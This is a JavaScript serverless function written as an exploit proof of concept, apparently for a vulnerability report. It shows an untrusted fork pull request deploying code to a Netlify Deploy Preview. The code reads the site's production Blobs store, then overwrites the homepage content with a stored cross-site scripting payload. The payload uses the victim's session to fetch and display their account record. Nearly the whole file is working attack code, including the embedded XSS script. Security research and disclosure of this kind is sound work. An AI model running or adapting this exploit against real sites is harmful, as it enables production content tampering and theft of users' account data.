// ATTACKER function, deployed by an UNTRUSTED external fork pull request into the victim
// site's Deploy Preview. No Netlify account, no write access to the victim repository.
// Path: sponge/netlify/functions/blob.js
// Invoked at: https://deploy-preview-2--spongebobssssssss.netlify.app/.netlify/functions/blob
//
// Demonstrates that the untrusted preview runtime holds a read AND write credential for the
// site's PRODUCTION Blobs store. Step 4 overwrites production content with a stored-XSS
// payload. The payload is self contained: it makes a same-origin credentialed fetch to the
// production /me endpoint and renders the victim's own account record into the page, so the
// proof is visible in a screenshot with no external collector involved.
import { getStore } from "@netlify/blobs";

export default async (req, context) => {
  const out = { ts: new Date().toISOString(), steps: {} };
  const safe = async (n, f) => { try { out.steps[n] = await f(); } catch (e) { out.steps[n] = { error: String(e).slice(0, 300) }; } };
  const store = getStore("production"); // site-wide store, shared with production

  await safe("list_all_keys", async () => (await store.list()).blobs.map(b => b.key));

  await safe("read_trusted_content_before", async () => ({
    key: "homepage_content",
    value: String(await store.get("homepage_content")),
  }));

  const XSS = `<script>
fetch('/.netlify/functions/me',{credentials:'include'})
  .then(function(r){ return r.text(); })
  .then(function(d){
    window.__EXODIA_ATO__ = d;
    document.title = 'EXODIA-ATO-FIRED';
    var el = document.getElementById('exodia-proof');
    if (el) el.textContent = 'ATTACKER SCRIPT RUNNING ON ' + location.origin + '\\nVICTIM ACCOUNT RECORD READ WITH THE VICTIM SESSION COOKIE:\\n' + d;
  })
  .catch(function(e){
    var el = document.getElementById('exodia-proof');
    if (el) el.textContent = 'fetch failed: ' + e;
  });
</script><h2>Welcome to Sponge</h2><pre id="exodia-proof" style="background:#111;color:#0f0;padding:12px;font-size:15px">(attacker payload has not run yet)</pre>`;

  await safe("poison_homepage_stored_xss", async () => {
    await store.set("homepage_content", XSS);
    return { wrote_bytes: XSS.length, payload: XSS };
  });

  await safe("read_trusted_content_after", async () => ({
    key: "homepage_content",
    value: String(await store.get("homepage_content")),
  }));

  return new Response(JSON.stringify(out, null, 2), {
    headers: { "content-type": "application/json", "cache-control": "no-store" },
  });
};